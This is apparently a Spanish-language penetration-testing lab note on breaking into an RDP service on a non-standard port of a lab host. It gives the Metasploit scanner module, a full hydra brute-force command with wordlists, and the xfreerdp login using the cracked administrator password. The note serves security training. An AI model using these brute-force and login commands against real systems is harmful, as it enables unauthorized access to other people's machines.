Ahora vamos a intentar explotar el servicio RDP

![[Pasted image 20240308094848.png]]

Como podemos ver en la anterior captura por defecto no aparece que el servicio RDP este habilitado, para ello tendremos que utilizar algun escaner de servicios, también hay que tener en cuenta que el servicio RDP puedo estar configurado en cualquier puerto, por lo que vemos de primeras con el escaneo revisaremos el puerto 3333.

Utilizando el siguiente modulo auxiliar revisaremos si se esta ejecutando el servicio RDP
auxiliary/scanner/rdp/rdp_scanner
![[Pasted image 20240308095239.png]]

Como podemos ver se esta ejecutando, ahora realizaremos un ataque de fuerza bruta para descubrir el usuario y la password para acceder
hydra -L /usr/share/metasploit-framework/data/wordlists/common_users.txt -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt rdp://10.2.28.248 -s 3333
![[Pasted image 20240308100042.png]]

Una vez obtenemos las credenciales con la herramienta [[Xfreerdp]] probaremos a acceder al equipo victima
xfreerdp /u:administrator /p:qwertyuiop /v:10.2.28.248:3333
![[Pasted image 20240308100431.png]]

Como podremos ver se nos abrirá una pantalla con la conexión en remoto
![[Pasted image 20240308100451.png]]



